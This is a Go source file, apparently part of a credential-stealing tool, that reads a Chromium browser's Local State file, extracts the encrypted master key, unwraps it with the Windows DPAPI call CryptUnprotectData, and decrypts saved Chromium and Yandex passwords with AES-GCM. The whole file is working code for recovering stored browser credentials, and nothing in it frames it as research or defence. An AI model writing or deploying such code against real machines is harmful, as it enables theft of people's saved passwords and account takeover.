package endpoint

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

func GetMasterKey(pather string) ([]byte, error) {

	var masterKey []byte

	jsonFile, err := os.Open(pather)
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := io.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	if !strings.Contains(string(byteValue), "encrypted_key") {
		return nil, fmt.Errorf("no masterkey")
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
	if err != nil {
		return masterKey, err
	}
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI")

	masterKey, err = DPApi([]byte(stringKey))
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil

}

var (
	dllCrypt        = syscall.NewLazyDLL("Crypt32.dll")
	dllKernel       = syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData = dllCrypt.NewProc("CryptUnprotectData")
	procLocalFree   = dllKernel.NewProc("LocalFree")
)

func DPApi(data []byte) ([]byte, error) {
	var outBlob dataBlob
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.ToByteArray(), nil
}

func (b *dataBlob) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Chromium(key, encryptPass []byte) ([]byte, error) {
	if len(encryptPass) > 15 {
		return aesGCMDecrypt(encryptPass[15:], key, encryptPass[3:15])
	} else {
		return nil, nil
	}
}

func ChromiumForYandex(key, encryptPass []byte) ([]byte, error) {
	if len(encryptPass) > 15 {
		return aesGCMDecrypt(encryptPass[12:], key, encryptPass[0:12])
	} else {
		return nil, nil
	}
}

func aesGCMDecrypt(crypted, key, nounce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil {
		return nil, err
	}
	return origData, nil
}

func NewBlob(d []byte) *dataBlob {
	if len(d) == 0 {
		return &dataBlob{}
	}
	return &dataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func geterr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func Copys(paths string) []byte {
	f, err := os.ReadFile(paths)
	geterr(err)
	return f
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob dataBlob
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}
